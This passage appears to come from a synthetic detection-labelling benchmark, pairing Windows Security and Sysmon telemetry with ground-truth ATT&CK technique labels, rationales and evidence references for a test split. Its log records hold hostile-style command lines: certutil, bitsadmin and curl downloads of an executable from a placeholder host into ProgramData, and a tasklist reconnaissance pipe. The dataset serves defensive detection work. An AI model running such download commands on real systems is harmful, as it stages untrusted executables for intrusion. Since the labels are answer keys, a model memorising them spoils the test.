    "computer": "WORKSTATION01",
    "event_id": "evt_99cae7a4",
    "event_record_id": 229956539862867,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c tasklist | findstr /i service > C:\\ProgramData\\beech_cedar_maple_3a4cce\\services.txt",
      "Computer": "WORKSTATION01",
      "EventID": 4688,
      "NewProcessId": "0x4e54",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x4e50",
      "SubjectLogonId": "0x4e55",
      "SubjectUserName": "admin.svc",
      "TargetUserName": "admin.svc",
      "TimeCreated": "2026-01-01T11:51:54Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-01-01T11:51:54Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_e37bb603",
    "event_record_id": 127663899160458,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "ProcessGuid": "{d124eddf-4f53-3bb0-6c88-5c07af890c9a}",
      "ProcessId": 20052,
      "TargetFilename": "C:\\ProgramData\\beech_cedar_maple_3a4cce\\services.txt",
      "User": "admin.svc",
      "UtcTime": "2026-01-01T11:51:57Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-01T11:51:57Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c tasklist | findstr /i service > C:\\ProgramData\\beech_cedar_maple_3a4cce\\services.txt",
    "Computer": "WORKSTATION01",
    "EventID": 4688,
    "NewProcessId": "0x4e54",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x4e50",
    "SubjectLogonId": "0x4e55",
    "SubjectUserName": "admin.svc",
    "TargetUserName": "admin.svc",
    "TimeCreated": "2026-01-01T11:51:54Z"
  },
  {
    "Computer": "WORKSTATION01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "ProcessGuid": "{d124eddf-4f53-3bb0-6c88-5c07af890c9a}",
    "ProcessId": 20052,
    "TargetFilename": "C:\\ProgramData\\beech_cedar_maple_3a4cce\\services.txt",
    "User": "admin.svc",
    "UtcTime": "2026-01-01T11:51:57Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1059_003_E/contextual",
  "evidence_refs": {
    "T1059.003": [
      {
        "event_id": "evt_99cae7a4",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessId",
          "NewProcessName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_e37bb603",
        "fields": [
          "Computer",
          "ProcessId",
          "TargetFilename",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The related file-creation event records the staged destination under the same process identity as the command-shell pipeline.",
  "technique_ids": [
    "T1059.003"
  ],
  "technique_names": [
    "Windows Command Shell"
  ],
  "view_id": "view_5408a25f"
}
```

## pair_026b0edb
Family: TF_T1105_A; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_14fb3c7e",
    "event_record_id": 250526002773280,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\certutil.exe -urlcache -split -f https://files.example.invalid/oak_elm_cedar_026b0e/package.exe C:\\ProgramData\\oak_elm_cedar_026b0e\\agent.exe",
      "Computer": "EXCH01",
      "EventID": 1,
      "Hashes": "SHA256=0dc1f88caefb12c025af2beff783da9855659ecd33c6e85f29712aa9f5c1ec34",
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "LogonGuid": "{34e7c9a3-a53a-e231-11f9-cb9e37e1723f}",
      "LogonId": "0x18b9",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{b4958cda-c564-36a7-e8fd-c506714efc76}",
      "ParentProcessId": 6324,
      "ProcessGuid": "{e3da2166-fd20-bc33-aaea-bf21080fb3f8}",
      "ProcessId": 6328,
      "User": "admin.svc",
      "UtcTime": "2026-01-23T22:45:45Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-23T22:45:45Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\certutil.exe -urlcache -split -f https://files.example.invalid/oak_elm_cedar_026b0e/package.exe C:\\ProgramData\\oak_elm_cedar_026b0e\\agent.exe",
    "Computer": "EXCH01",
    "EventID": 1,
    "Hashes": "SHA256=0dc1f88caefb12c025af2beff783da9855659ecd33c6e85f29712aa9f5c1ec34",
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "LogonGuid": "{34e7c9a3-a53a-e231-11f9-cb9e37e1723f}",
    "LogonId": "0x18b9",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{b4958cda-c564-36a7-e8fd-c506714efc76}",
    "ParentProcessId": 6324,
    "ProcessGuid": "{e3da2166-fd20-bc33-aaea-bf21080fb3f8}",
    "ProcessId": 6328,
    "User": "admin.svc",
    "UtcTime": "2026-01-23T22:45:45Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1105_A/single",
  "evidence_refs": {
    "T1105": [
      {
        "event_id": "evt_14fb3c7e",
        "fields": [
          "CommandLine",
          "Image"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The process command line contains concrete certutil download syntax, source URL, and destination path.",
  "technique_ids": [
    "T1105"
  ],
  "technique_names": [
    "Ingress Tool Transfer"
  ],
  "view_id": "view_ac4caf1b"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_14fb3c7e",
    "event_record_id": 250526002773280,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\certutil.exe -urlcache -split -f https://files.example.invalid/oak_elm_cedar_026b0e/package.exe C:\\ProgramData\\oak_elm_cedar_026b0e\\agent.exe",
      "Computer": "EXCH01",
      "EventID": 1,
      "Hashes": "SHA256=0dc1f88caefb12c025af2beff783da9855659ecd33c6e85f29712aa9f5c1ec34",
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "LogonGuid": "{34e7c9a3-a53a-e231-11f9-cb9e37e1723f}",
      "LogonId": "0x18b9",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{b4958cda-c564-36a7-e8fd-c506714efc76}",
      "ParentProcessId": 6324,
      "ProcessGuid": "{e3da2166-fd20-bc33-aaea-bf21080fb3f8}",
      "ProcessId": 6328,
      "User": "admin.svc",
      "UtcTime": "2026-01-23T22:45:45Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-23T22:45:45Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "EXCH01",
    "event_id": "evt_a06c7fe3",
    "event_record_id": 123306152063513,
    "fields": {
      "Computer": "EXCH01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "ProcessGuid": "{e3da2166-fd20-bc33-aaea-bf21080fb3f8}",
      "ProcessId": 6328,
      "TargetFilename": "C:\\ProgramData\\oak_elm_cedar_026b0e\\agent.exe",
      "User": "admin.svc",
      "UtcTime": "2026-01-23T22:45:48Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-23T22:45:48Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\certutil.exe -urlcache -split -f https://files.example.invalid/oak_elm_cedar_026b0e/package.exe C:\\ProgramData\\oak_elm_cedar_026b0e\\agent.exe",
    "Computer": "EXCH01",
    "EventID": 1,
    "Hashes": "SHA256=0dc1f88caefb12c025af2beff783da9855659ecd33c6e85f29712aa9f5c1ec34",
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "LogonGuid": "{34e7c9a3-a53a-e231-11f9-cb9e37e1723f}",
    "LogonId": "0x18b9",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{b4958cda-c564-36a7-e8fd-c506714efc76}",
    "ParentProcessId": 6324,
    "ProcessGuid": "{e3da2166-fd20-bc33-aaea-bf21080fb3f8}",
    "ProcessId": 6328,
    "User": "admin.svc",
    "UtcTime": "2026-01-23T22:45:45Z"
  },
  {
    "Computer": "EXCH01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\certutil.exe",
    "ProcessGuid": "{e3da2166-fd20-bc33-aaea-bf21080fb3f8}",
    "ProcessId": 6328,
    "TargetFilename": "C:\\ProgramData\\oak_elm_cedar_026b0e\\agent.exe",
    "User": "admin.svc",
    "UtcTime": "2026-01-23T22:45:48Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1105_A/contextual",
  "evidence_refs": {
    "T1105": [
      {
        "event_id": "evt_14fb3c7e",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "ProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_a06c7fe3",
        "fields": [
          "Computer",
          "ProcessGuid",
          "TargetFilename",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The linked file-create event confirms the downloaded artifact was written to the declared destination.",
  "technique_ids": [
    "T1105"
  ],
  "technique_names": [
    "Ingress Tool Transfer"
  ],
  "view_id": "view_a6577760"
}
```

## pair_1848ffdd
Family: TF_T1105_B; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_28dd7d44",
    "event_record_id": 275199756767213,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\bitsadmin.exe /transfer alder_holly_willow_1848ff https://files.example.invalid/alder_holly_willow_1848ff/package.exe C:\\ProgramData\\alder_holly_willow_1848ff\\agent.exe",
      "Computer": "APPSVR01",
      "EventID": 1,
      "Hashes": "SHA256=22137094e36b6811e221953782831900934461ed927fcff54654d06a99a773b5",
      "Image": "C:\\Windows\\System32\\bitsadmin.exe",
      "LogonGuid": "{4d333dd7-27c3-0094-881d-5ab1fcde671f}",
      "LogonId": "0xd091",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{839d0ade-f7f4-c5d7-579d-109c966919c9}",
      "ParentProcessId": 53388,
      "ProcessGuid": "{fa4aefbe-8fed-b629-3302-47848b0c8445}",
      "ProcessId": 53392,
      "User": "wlee",
      "UtcTime": "2026-01-02T03:10:35Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-02T03:10:35Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\bitsadmin.exe /transfer alder_holly_willow_1848ff https://files.example.invalid/alder_holly_willow_1848ff/package.exe C:\\ProgramData\\alder_holly_willow_1848ff\\agent.exe",
    "Computer": "APPSVR01",
    "EventID": 1,
    "Hashes": "SHA256=22137094e36b6811e221953782831900934461ed927fcff54654d06a99a773b5",
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "LogonGuid": "{4d333dd7-27c3-0094-881d-5ab1fcde671f}",
    "LogonId": "0xd091",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{839d0ade-f7f4-c5d7-579d-109c966919c9}",
    "ParentProcessId": 53388,
    "ProcessGuid": "{fa4aefbe-8fed-b629-3302-47848b0c8445}",
    "ProcessId": 53392,
    "User": "wlee",
    "UtcTime": "2026-01-02T03:10:35Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1105_B/single",
  "evidence_refs": {
    "T1105": [
      {
        "event_id": "evt_28dd7d44",
        "fields": [
          "CommandLine",
          "Image"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The BITSAdmin command visibly specifies a transfer job, remote source, and local destination.",
  "technique_ids": [
    "T1105"
  ],
  "technique_names": [
    "Ingress Tool Transfer"
  ],
  "view_id": "view_eb13480d"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_28dd7d44",
    "event_record_id": 275199756767213,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\bitsadmin.exe /transfer alder_holly_willow_1848ff https://files.example.invalid/alder_holly_willow_1848ff/package.exe C:\\ProgramData\\alder_holly_willow_1848ff\\agent.exe",
      "Computer": "APPSVR01",
      "EventID": 1,
      "Hashes": "SHA256=22137094e36b6811e221953782831900934461ed927fcff54654d06a99a773b5",
      "Image": "C:\\Windows\\System32\\bitsadmin.exe",
      "LogonGuid": "{4d333dd7-27c3-0094-881d-5ab1fcde671f}",
      "LogonId": "0xd091",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{839d0ade-f7f4-c5d7-579d-109c966919c9}",
      "ParentProcessId": 53388,
      "ProcessGuid": "{fa4aefbe-8fed-b629-3302-47848b0c8445}",
      "ProcessId": 53392,
      "User": "wlee",
      "UtcTime": "2026-01-02T03:10:35Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-02T03:10:35Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "APPSVR01",
    "event_id": "evt_93a31a3c",
    "event_record_id": 202003310580477,
    "fields": {
      "Computer": "APPSVR01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\bitsadmin.exe",
      "ProcessGuid": "{fa4aefbe-8fed-b629-3302-47848b0c8445}",
      "ProcessId": 53392,
      "TargetFilename": "C:\\ProgramData\\alder_holly_willow_1848ff\\agent.exe",
      "User": "wlee",
      "UtcTime": "2026-01-02T03:10:38Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-02T03:10:38Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\bitsadmin.exe /transfer alder_holly_willow_1848ff https://files.example.invalid/alder_holly_willow_1848ff/package.exe C:\\ProgramData\\alder_holly_willow_1848ff\\agent.exe",
    "Computer": "APPSVR01",
    "EventID": 1,
    "Hashes": "SHA256=22137094e36b6811e221953782831900934461ed927fcff54654d06a99a773b5",
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "LogonGuid": "{4d333dd7-27c3-0094-881d-5ab1fcde671f}",
    "LogonId": "0xd091",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{839d0ade-f7f4-c5d7-579d-109c966919c9}",
    "ParentProcessId": 53388,
    "ProcessGuid": "{fa4aefbe-8fed-b629-3302-47848b0c8445}",
    "ProcessId": 53392,
    "User": "wlee",
    "UtcTime": "2026-01-02T03:10:35Z"
  },
  {
    "Computer": "APPSVR01",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
    "ProcessGuid": "{fa4aefbe-8fed-b629-3302-47848b0c8445}",
    "ProcessId": 53392,
    "TargetFilename": "C:\\ProgramData\\alder_holly_willow_1848ff\\agent.exe",
    "User": "wlee",
    "UtcTime": "2026-01-02T03:10:38Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1105_B/contextual",
  "evidence_refs": {
    "T1105": [
      {
        "event_id": "evt_28dd7d44",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "ProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_93a31a3c",
        "fields": [
          "Computer",
          "ProcessGuid",
          "TargetFilename",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The file-creation event records a local file at the requested destination; it does not independently prove BITS produced its contents.",
  "technique_ids": [
    "T1105"
  ],
  "technique_names": [
    "Ingress Tool Transfer"
  ],
  "view_id": "view_e9e7226f"
}
```

## pair_0e2514d9
Family: TF_T1105_C; split: test
Transition: mapped -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION02",
    "event_id": "evt_8ae2af70",
    "event_record_id": 206034170196911,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\curl.exe https://files.example.invalid/larch_alder_yew_0e2514/package.exe -o C:\\ProgramData\\larch_alder_yew_0e2514\\agent.exe",
      "Computer": "WORKSTATION02",
      "EventID": 1,
      "Hashes": "SHA256=f0b1c34575aadc1f4469b384029e933c12303dbc80e7f93d471aff2bc8d99359",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "LogonGuid": "{e71472f6-0929-c1fe-0bd5-977a5694ff8f}",
      "LogonId": "0x137a5",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{d2cb0038-f484-bd2a-64e7-0e159432559b}",
      "ParentProcessId": 79776,
      "ProcessGuid": "{bb631186-b3af-c43f-6482-e52dd0ea4100}",
      "ProcessId": 79780,
      "User": "jsmith",
      "UtcTime": "2026-06-29T07:16:29Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-29T07:16:29Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\curl.exe https://files.example.invalid/larch_alder_yew_0e2514/package.exe -o C:\\ProgramData\\larch_alder_yew_0e2514\\agent.exe",
    "Computer": "WORKSTATION02",
    "EventID": 1,
    "Hashes": "SHA256=f0b1c34575aadc1f4469b384029e933c12303dbc80e7f93d471aff2bc8d99359",
    "Image": "C:\\Windows\\System32\\curl.exe",
    "LogonGuid": "{e71472f6-0929-c1fe-0bd5-977a5694ff8f}",
    "LogonId": "0x137a5",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{d2cb0038-f484-bd2a-64e7-0e159432559b}",
    "ParentProcessId": 79776,
    "ProcessGuid": "{bb631186-b3af-c43f-6482-e52dd0ea4100}",
    "ProcessId": 79780,
    "User": "jsmith",
    "UtcTime": "2026-06-29T07:16:29Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1105_C/single",
  "evidence_refs": {
    "T1105": [
      {
        "event_id": "evt_8ae2af70",
        "fields": [
          "CommandLine",
          "Image"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The curl command explicitly carries source and destination arguments for a transfer.",
  "technique_ids": [
    "T1105"
  ],
  "technique_names": [
    "Ingress Tool Transfer"
  ],
  "view_id": "view_3e95f499"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION02",
    "event_id": "evt_8ae2af70",
    "event_record_id": 206034170196911,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\curl.exe https://files.example.invalid/larch_alder_yew_0e2514/package.exe -o C:\\ProgramData\\larch_alder_yew_0e2514\\agent.exe",
      "Computer": "WORKSTATION02",
      "EventID": 1,
      "Hashes": "SHA256=f0b1c34575aadc1f4469b384029e933c12303dbc80e7f93d471aff2bc8d99359",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "LogonGuid": "{e71472f6-0929-c1fe-0bd5-977a5694ff8f}",
      "LogonId": "0x137a5",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{d2cb0038-f484-bd2a-64e7-0e159432559b}",
      "ParentProcessId": 79776,
      "ProcessGuid": "{bb631186-b3af-c43f-6482-e52dd0ea4100}",
      "ProcessId": 79780,
      "User": "jsmith",
      "UtcTime": "2026-06-29T07:16:29Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-29T07:16:29Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION02",
    "event_id": "evt_bb6a1c09",
    "event_record_id": 60062091909113,
    "fields": {
      "Computer": "WORKSTATION02",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\curl.exe",
      "ProcessGuid": "{bb631186-b3af-c43f-6482-e52dd0ea4100}",
      "ProcessId": 79780,
      "TargetFilename": "C:\\ProgramData\\larch_alder_yew_0e2514\\agent.exe",
      "User": "jsmith",
      "UtcTime": "2026-06-29T07:16:32Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-06-29T07:16:32Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\curl.exe https://files.example.invalid/larch_alder_yew_0e2514/package.exe -o C:\\ProgramData\\larch_alder_yew_0e2514\\agent.exe",
    "Computer": "WORKSTATION02",
    "EventID": 1,
    "Hashes": "SHA256=f0b1c34575aadc1f4469b384029e933c12303dbc80e7f93d471aff2bc8d99359",
    "Image": "C:\\Windows\\System32\\curl.exe",
    "LogonGuid": "{e71472f6-0929-c1fe-0bd5-977a5694ff8f}",
    "LogonId": "0x137a5",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{d2cb0038-f484-bd2a-64e7-0e159432559b}",
    "ParentProcessId": 79776,
    "ProcessGuid": "{bb631186-b3af-c43f-6482-e52dd0ea4100}",
    "ProcessId": 79780,
    "User": "jsmith",
    "UtcTime": "2026-06-29T07:16:29Z"
  },
  {
    "Computer": "WORKSTATION02",
    "EventID": 11,
    "Image": "C:\\Windows\\System32\\curl.exe",
    "ProcessGuid": "{bb631186-b3af-c43f-6482-e52dd0ea4100}",
    "ProcessId": 79780,
    "TargetFilename": "C:\\ProgramData\\larch_alder_yew_0e2514\\agent.exe",
    "User": "jsmith",
    "UtcTime": "2026-06-29T07:16:32Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1105_C/contextual",
  "evidence_refs": {
    "T1105": [
      {
        "event_id": "evt_8ae2af70",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "ProcessGuid",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_bb6a1c09",
        "fields": [
          "Computer",
          "ProcessGuid",
          "TargetFilename",
          "UtcTime"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "The file-create event corroborates the local artifact produced by curl.",
  "technique_ids": [
    "T1105"
  ],
  "technique_names": [
    "Ingress Tool Transfer"
  ],
  "view_id": "view_b2acded3"
}
```

## pair_0836c462
Family: TF_T1105_D; split: test
Transition: ambiguous -> mapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_70e7bfd7",
    "event_record_id": 56811322924994,
    "fields": {
      "Computer": "WORKSTATION01",
      "DestinationIp": "203.0.113.20",
      "DestinationPort": 443,
      "EventID": 3,
      "Image": "C:\\Windows\\System32\\curl.exe",
      "ProcessGuid": "{20d6dfbe-6bbc-9aff-fa7b-bb27610717e8}",
      "ProcessId": 75836,
      "Protocol": "tcp",
      "SourceIp": "198.51.100.10",
      "SourcePort": 63712,
      "User": "agarcia",
      "UtcTime": "2026-01-23T09:29:06Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-23T09:29:06Z",
    "windows_event_id": 3
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "DestinationIp": "203.0.113.20",
    "DestinationPort": 443,
    "EventID": 3,
    "Image": "C:\\Windows\\System32\\curl.exe",
    "ProcessGuid": "{20d6dfbe-6bbc-9aff-fa7b-bb27610717e8}",
    "ProcessId": 75836,
    "Protocol": "tcp",
    "SourceIp": "198.51.100.10",
    "SourcePort": 63712,
    "User": "agarcia",
    "UtcTime": "2026-01-23T09:29:06Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_T1105_D/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_70e7bfd7",
        "fields": [
          "DestinationIp",
          "DestinationPort"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "Network-only Sysmon EID 3 shows a connection but not whether bytes were a tool transfer.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_8e970c06"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_ca1ffffa",
    "event_record_id": 36107248888764,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\curl.exe https://files.example.invalid/oak_beech_aspen_0836c4/package.exe -o C:\\ProgramData\\oak_beech_aspen_0836c4\\agent.exe",
      "Computer": "WORKSTATION01",
      "EventID": 1,
      "Hashes": "SHA256=f0b1c34575aadc1f4469b384029e933c12303dbc80e7f93d471aff2bc8d99359",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "LogonGuid": "{466d2e28-ffa8-646e-4610-b82ff2725843}",
      "LogonId": "0x12839",
      "ParentCommandLine": "C:\\Windows\\explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentProcessGuid": "{8bd0e255-4dd6-99bf-0cb4-0d5691d935f0}",
      "ParentProcessId": 75828,
      "ProcessGuid": "{20d6dfbe-6bbc-9aff-fa7b-bb27610717e8}",
      "ProcessId": 75836,
      "User": "agarcia",
      "UtcTime": "2026-01-23T09:29:03Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-23T09:29:03Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_70e7bfd7",
    "event_record_id": 56811322924994,
    "fields": {
      "Computer": "WORKSTATION01",
      "DestinationIp": "203.0.113.20",
      "DestinationPort": 443,
      "EventID": 3,
      "Image": "C:\\Windows\\System32\\curl.exe",
      "ProcessGuid": "{20d6dfbe-6bbc-9aff-fa7b-bb27610717e8}",
      "ProcessId": 75836,
      "Protocol": "tcp",
      "SourceIp": "198.51.100.10",
      "SourcePort": 63712,
      "User": "agarcia",
      "UtcTime": "2026-01-23T09:29:06Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-23T09:29:06Z",
    "windows_event_id": 3
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WORKSTATION01",
    "event_id": "evt_4ea42387",
    "event_record_id": 160735468573768,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 11,
      "Image": "C:\\Windows\\System32\\curl.exe",
      "ProcessGuid": "{20d6dfbe-6bbc-9aff-fa7b-bb27610717e8}",
      "ProcessId": 75836,
      "TargetFilename": "C:\\ProgramData\\oak_beech_aspen_0836c4\\agent.exe",
      "User": "agarcia",
      "UtcTime": "2026-01-23T09:29:09Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-23T09:29:09Z",
    "windows_event_id": 11
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\curl.exe https://files.example.invalid/oak_beech_aspen_0836c4/package.exe -o C:\\ProgramData\\oak_beech_aspen_0836c4\\agent.exe",
    "Computer": "WORKSTATION01",
    "EventID": 1,
    "Hashes": "SHA256=f0b1c34575aadc1f4469b384029e933c12303dbc80e7f93d471aff2bc8d99359",
    "Image": "C:\\Windows\\System32\\curl.exe",
    "LogonGuid": "{466d2e28-ffa8-646e-4610-b82ff2725843}",
    "LogonId": "0x12839",
    "ParentCommandLine": "C:\\Windows\\explorer.exe",
    "ParentImage": "C:\\Windows\\explorer.exe",
    "ParentProcessGuid": "{8bd0e255-4dd6-99bf-0cb4-0d5691d935f0}",
    "ParentProcessId": 75828,
    "ProcessGuid": "{20d6dfbe-6bbc-9aff-fa7b-bb27610717e8}",
    "ProcessId": 75836,
    "User": "agarcia",
    "UtcTime": "2026-01-23T09:29:03Z"
  },
  {
    "Computer": "WORKSTATION01",
    "DestinationIp": "203.0.113.20",
    "DestinationPort": 443,
    "EventID": 3,
    "Image": "C:\\Windows\\System32\\curl.exe",
